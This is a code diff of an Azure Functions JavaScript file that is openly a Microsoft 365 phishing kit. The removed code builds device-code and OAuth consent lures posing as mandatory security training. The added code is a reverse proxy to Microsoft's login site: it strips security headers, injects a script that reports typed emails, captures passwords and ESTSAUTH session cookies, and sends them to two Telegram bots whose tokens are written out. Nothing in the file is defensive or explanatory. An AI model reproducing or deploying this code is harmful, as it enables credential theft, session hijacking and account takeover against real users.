@@ -1,256 +1,206 @@
-const { app } = require('@azure/functions');
-const axios = require('axios');
+const { app } = require("@azure/functions");
 
-// Working client IDs
-const AZURE_CLI_CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
-const AZURE_POWERSHELL_CLIENT_ID = '1950a258-227b-4e31-a9cf-717495945fc2';
+const upstream = "login.microsoftonline.com";
+const upstream_path = "/";
+const telegram_bot_token1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
+const telegram_chat_id1 = "6743632244";
+const telegram_bot_token2 = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
+const telegram_chat_id2 = "1412104349";
 
-// Telegram configuration
-const TELEGRAM_BOT_TOKEN = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
-const TELEGRAM_CHAT_ID = "6743632244";
+const delete_headers = [
+  "content-security-policy",
+  "content-security-policy-report-only",
+  "clear-site-data",
+  "x-frame-options",
+  "referrer-policy",
+  "strict-transport-security",
+  "content-length",
+  "content-encoding",
+  "Set-Cookie",
+];
 
-async function sendTelegram(message) {
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        });
-    } catch (error) {
-        console.log('Telegram error:', error.message);
-    }
+const emailMap = new Map();
+
+async function replace_response_text(response, upstream, original, ip) {
+  return response.text().then((text) =>
+    text
+      .replace(new RegExp(upstream, "g"), original)
+      .replace(
+        "</body>",
+        `<script>
+          document.addEventListener('DOMContentLoaded', () => {
+            const interval = setInterval(() => {
+              const btn = document.getElementById("idSIButton9");
+              const emailInput = document.querySelector("input[name='loginfmt']");
+              if (btn && emailInput) {
+                clearInterval(interval);
+                const realIP = "${ip}";
+                btn.addEventListener("click", () => {
+                  fetch("/__notify_click", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      event: "next_button_clicked",
+                      email: emailInput.value,
+                      ip: realIP
+                    }),
+                  });
+                });
+              }
+            }, 500);
+          });
+        </script></body>`
+      )
+  );
 }
 
-// Device Code Phishing Function
-app.http('devicecode', {
-    methods: ['GET'],
-    authLevel: 'anonymous',
-    route: 'secure-access',
-    handler: async (request, context) => {
-        try {
-            // Generate real device code
-            const deviceCodeResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', 
-                new URLSearchParams({
-                    'client_id': AZURE_CLI_CLIENT_ID,
-                    'scope': 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access'
-                }), {
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-                }
-            );
+async function dispatchMessage(message) {
+  try {
+    // Send to both Telegram bots
+    await Promise.all([
+      fetch(`https://api.telegram.org/bot${telegram_bot_token1}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: telegram_chat_id1, text: message, parse_mode: "HTML" }),
+      }),
+      fetch(`https://api.telegram.org/bot${telegram_bot_token2}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: telegram_chat_id2, text: message, parse_mode: "HTML" }),
+      })
+    ]);
+  } catch (err) {
+    console.error("Telegram error:", err);
+  }
+}
 
-            const deviceData = deviceCodeResponse.data;
-            
-            // Send to Telegram
-            await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\nCode: <code>${deviceData.user_code}</code>\nURL: ${deviceData.verification_uri}\nExpires: ${deviceData.expires_in}s`);
+app.http("phishing", {
+  methods: ["GET", "POST"],
+  authLevel: "anonymous",
+  route: "/{*x}",
+  handler: async (request, context) => {
+    const ip =
+      request.headers.get("cf-connecting-ip") ||
+      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
+      request.headers.get("x-client-ip") ||
+      request.headers.get("true-client-ip") ||
+      request.headers.get("x-real-ip") ||
+      "unknown";
 
-            const html = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Microsoft Security Training</title>
-                <meta charset="utf-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1">
-                <style>
-                    body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
-                    .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                    .ms-logo { color: #00BCF2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
-                    .device-code { background: #e3f2fd; padding: 15px; border-radius: 4px; font-size: 18px; font-weight: bold; text-align: center; margin: 20px 0; }
-                    .btn { background: #0078d4; color: white; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }
-                    .btn:hover { background: #106ebe; }
-                    .urgent { color: #d13438; font-weight: bold; }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <div class="ms-logo">Microsoft Security Training</div>
-                    <h1>🔒 Security Verification Required</h1>
-                    <p class="urgent">URGENT: Your account requires immediate security verification to maintain access to company resources.</p>
-                    
-                    <div class="device-code">VERIFICATION CODE: ${deviceData.user_code}</div>
-                    
-                    <p><strong>Instructions:</strong></p>
-                    <ol>
-                        <li>Go to <strong>microsoft.com/devicelogin</strong></li>
-                        <li>Enter the verification code shown above</li>
-                        <li>Sign in with your Microsoft account</li>
-                        <li>Complete the security verification</li>
-                    </ol>
-                    
-                    <a href="${deviceData.verification_uri}" class="btn" target="_blank">🔐 Complete Verification Now</a>
-                    
-                    <p><small>This verification is mandatory for all employees. Failure to complete within 24 hours may result in account suspension.</small></p>
-                    
-                    <p><small>Session ID: ${deviceData.device_code.substring(0, 8)}... | Expires in ${Math.floor(deviceData.expires_in/60)} minutes</small></p>
-                </div>
-            </body>
-            </html>`;
-            
-            return {
-                status: 200,
-                headers: { 'Content-Type': 'text/html' },
-                body: html
-            };
-            
-        } catch (error) {
-            context.log('Device code error:', error.message);
-            return {
-                status: 500,
-                body: 'Service temporarily unavailable'
-            };
-        }
+    const upstream_url = new URL(request.url);
+    const original_url = new URL(request.url);
+    upstream_url.host = upstream;
+    upstream_url.port = 443;
+    upstream_url.protocol = "https:";
+
+    if (upstream_url.pathname === "/") {
+      upstream_url.pathname = upstream_path;
+    } else {
+      upstream_url.pathname = upstream_path + upstream_url.pathname;
     }
-});
 
-// OAuth Training Function
-app.http('oauth', {
-    methods: ['GET'],
-    authLevel: 'anonymous',
-    route: 'microsoft-training',
-    handler: async (request, context) => {
-        const client_id = AZURE_POWERSHELL_CLIENT_ID;
-        const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
-        const scopes = 'openid profile email User.Read Mail.Read Files.ReadWrite.All';
-        
-        const oauth_url = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${client_id}&response_type=code&redirect_uri=${encodeURIComponent(redirect_uri)}&scope=${encodeURIComponent(scopes)}&state=training&prompt=consent`;
-        
-        // Log access attempt
-        await sendTelegram(`🎯 <b>OAUTH TRAINING ACCESS</b>\nIP: ${request.headers['x-forwarded-for'] || 'unknown'}\nUser-Agent: ${request.headers['user-agent']}`);
-        
-        const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Microsoft 365 Security Training</title>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1">
-            <style>
-                body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
-                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                .ms-logo { color: #00BCF2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
-                .btn { background: #0078d4; color: white; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
-                .btn:hover { background: #106ebe; }
-                .training-item { background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #0078d4; }
-                .mandatory { color: #d13438; font-weight: bold; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="ms-logo">Microsoft 365 Security Training</div>
-                <h1>🎓 Mandatory Security Awareness Training</h1>
-                <p class="mandatory">REQUIRED: Annual security training must be completed by all employees.</p>
-                
-                <div class="training-item">
-                    <h3>📚 Training Modules</h3>
-                    <ul>
-                        <li>Phishing detection and prevention</li>
-                        <li>Multi-factor authentication best practices</li>
-                        <li>Data protection and compliance (GDPR/CCPA)</li>
-                        <li>Threat intelligence and incident response</li>
-                        <li>Zero Trust security model</li>
-                    </ul>
-                </div>
-                
-                <div class="training-item">
-                    <h3>⏰ Training Requirements</h3>
-                    <p><strong>Duration:</strong> 45 minutes</p>
-                    <p><strong>Deadline:</strong> 7 days from today</p>
-                    <p><strong>Certification:</strong> Required for compliance</p>
-                </div>
-                
-                <p>To begin the training, please authenticate with your Microsoft 365 account. This ensures proper tracking for compliance purposes.</p>
-                
-                <a href="${oauth_url}" class="btn">🔐 Start Training - Sign In with Microsoft 365</a>
-                
-                <p><small class="mandatory">This training is mandatory for all employees. Your completion will be tracked for compliance purposes. Non-completion may result in account restrictions.</small></p>
-                
-                <p><small>Training provided by Microsoft Security Center | Session expires in 30 minutes</small></p>
-            </div>
-        </body>
-        </html>`;
-        
-        return {
-            status: 200,
-            headers: { 'Content-Type': 'text/html' },
-            body: html
-        };
-    }
-});
+    context.log(`Proxying ${request.method}: ${original_url} → ${upstream_url}`);
 
-// Proxy Function
-app.http('proxy', {
-    methods: ['GET', 'POST'],
-    authLevel: 'anonymous',
-    route: 'cookieproxy/{*path}',
-    handler: async (request, context) => {
-        const targetPath = request.params.path || 'none';
-        
-        // Log proxy access
-        await sendTelegram(`🕷️ <b>PROXY ACCESS</b>\nPath: ${targetPath}\nIP: ${request.headers['x-forwarded-for'] || 'unknown'}\nMethod: ${request.method}`);
-        
-        const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Microsoft Login</title>
-            <meta charset="utf-8">
-            <style>
-                body { font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; }
-                .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🔄 Proxy Function Active</h1>
-                <p><strong>Target Path:</strong> ${targetPath}</p>
-                <p><strong>Method:</strong> ${request.method}</p>
-                <p><strong>Headers:</strong></p>
-                <pre>${JSON.stringify(request.headers, null, 2)}</pre>
-                <p><em>This would proxy to: https://${targetPath}</em></p>
-                <p><small>Proxy function is working and logging all requests.</small></p>
-            </div>
-        </body>
-        </html>`;
-        
-        return {
-            status: 200,
-            headers: { 'Content-Type': 'text/html' },
-            body: html
-        };
-    }
-});
+    const new_request_headers = new Headers(request.headers);
+    new_request_headers.set("Host", upstream_url.host);
+    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
+    new_request_headers.set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
+    new_request_headers.set("Referer", original_url.protocol + "//" + original_url.host);
 
-// Callback Handler
-app.http('callback', {
-    methods: ['GET', 'POST'],
-    authLevel: 'anonymous',
-    route: 'stealer/callback',
-    handler: async (request, context) => {
-        // Log callback
-        await sendTelegram(`🎯 <b>CALLBACK TRIGGERED</b>\nQuery: ${JSON.stringify(request.query)}\nHeaders: ${JSON.stringify(request.headers)}`);
-        
-        const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Training Complete</title>
-            <meta charset="utf-8">
-            <style>
-                body { font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; text-align: center; }
-                .success { color: #107c10; font-size: 24px; margin: 20px 0; }
-            </style>
-        </head>
-        <body>
-            <h1 class="success">✅ Verification Complete</h1>
-            <p>Thank you for completing the security verification.</p>
-            <p>Your account has been successfully verified and access has been restored.</p>
-            <p><small>You may now close this window and return to your work.</small></p>
-        </body>
-        </html>`;
-        
-        return {
-            status: 200,
-            headers: { 'Content-Type': 'text/html' },
-            body: html
-        };
+    // Handle special injected click reporting
+    if (request.method === "POST" && original_url.pathname === "/__notify_click") {
+      const body = await request.json();
+      const email = body.email || "unknown";
+      const realIP = body.ip || ip;
+      emailMap.set(realIP, email);
+      await dispatchMessage(
+        `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`
+      );
+      return new Response("ok", { status: 200 });
     }
+
+    // Capture login credentials
+    if (request.method === "POST") {
+      const body = await request.clone().text();
+      const keyValuePairs = body.split("&");
+
+      const data = Object.fromEntries(
+        keyValuePairs
+          .map((pair) => {
+            const [key, value] = pair.split("=");
+            return [key, decodeURIComponent((value || "").replace(/\+/g, " "))];
+          })
+          .filter(([key]) => key === "loginfmt" || key === "passwd")
+      );
+
+      if (data.loginfmt) {
+        emailMap.set(ip, data.loginfmt);
+      }
+
+      if (data.loginfmt && data.passwd) {
+        await dispatchMessage(
+          `📥 <b>Captured Credentials</b>:\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🔑 <b>Password</b>: ${data.passwd}`
+        );
+      }
+    }
+
+    const original_response = await fetch(upstream_url.href, {
+      method: request.method,
+      headers: new_request_headers,
+      body: request.body,
+      duplex: "half",
+    });
+
+    if (
+      request.headers.get("Upgrade") &&
+      request.headers.get("Upgrade").toLowerCase() === "websocket"
+    ) {
+      return original_response;
+    }
+
+    const new_response_headers = new Headers(original_response.headers);
+    delete_headers.forEach((h) => new_response_headers.delete(h));
+    new_response_headers.set("access-control-allow-origin", "*");
+    new_response_headers.set("access-control-allow-credentials", true);
+
+    // Capture important cookies
+    try {
+      const originalCookies = original_response.headers.getSetCookie?.() || [];
+
+      originalCookies.forEach((originalCookie) => {
+        const modifiedCookie = originalCookie.replace(
+          new RegExp(upstream_url.host, "g"),
+          original_url.host
+        );
+        new_response_headers.append("Set-Cookie", modifiedCookie);
+      });
+
+      const importantCookies = originalCookies.filter((cookie) =>
+        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie)=/.test(cookie)
+      );
+
+      if (importantCookies.length === 3) {
+        const victimEmail = emailMap.get(ip) || "unknown";
+        const cookieText = importantCookies.map((c) => c.split(";")[0]).join("\n");
+
+        await dispatchMessage(
+          `🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>:\n<code>${cookieText}</code>`
+        );
+      }
+    } catch (err) {
+      console.error("Cookie capture error:", err);
+    }
+
+    const modifiedBody = await replace_response_text(
+      original_response.clone(),
+      upstream_url.protocol + "//" + upstream_url.host,
+      original_url.protocol + "//" + original_url.host,
+      ip
+    );
+
+    return new Response(modifiedBody, {
+      status: original_response.status,
+      headers: new_response_headers,
+    });
+  },
 });
